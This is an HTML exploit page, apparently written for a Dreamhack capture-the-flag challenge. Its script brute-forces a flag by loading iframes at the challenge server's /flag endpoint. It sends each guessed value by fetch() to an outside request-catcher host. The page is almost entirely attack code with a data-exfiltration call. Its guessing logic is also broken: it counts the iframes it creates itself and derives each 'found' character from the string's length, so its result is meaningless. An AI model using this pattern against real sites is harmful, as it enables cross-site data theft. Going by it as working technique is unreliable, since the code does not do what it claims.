<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Tracker</title>
</head>
<body>
    <h1>Flag Tracker</h1>
    <div id="iframeContainer"></div>
    <script>
        let serverFlag = '';
        let previousIframesCount = 0;

        const loadIframe = (char) => {
            const iframe = document.createElement('iframe');
            iframe.src = `http://war.sschall.xyz:60001/flag?flag=${encodeURIComponent(serverFlag + char)}`;
            document.getElementById('iframeContainer').appendChild(iframe);
        };

        const checkIframes = () => {
            const iframes = document.getElementById('iframeContainer').getElementsByTagName('iframe');
            const currentCount = iframes.length;

            if (currentCount > previousIframesCount) {
                const foundChar = String.fromCharCode(serverFlag.length + 32);
                console.log(`New character found: ${foundChar}`);
                serverFlag += foundChar; // 해당 문자 추가
                previousIframesCount = currentCount;

                // 최종 요청 보내기
                const finalRequestUrl = `https://emadptv.request.dreamhack.games?flag=${encodeURIComponent(serverFlag)}`;
                fetch(finalRequestUrl); // 요청 보내기

                if (serverFlag.length < 95) { // 32부터 127까지
                    loadIframe(String.fromCharCode(serverFlag.length + 32));
                } else {
                    console.log('Final FLAG:', serverFlag);
                }
            }
        };

        const start = () => {
            for (let i = 32; i <= 127; i++) {
                loadIframe(String.fromCharCode(i));
            }
            setInterval(checkIframes, 500); // 0.5초마다 체크
        };

        start();
    </script>
</body>
</html>
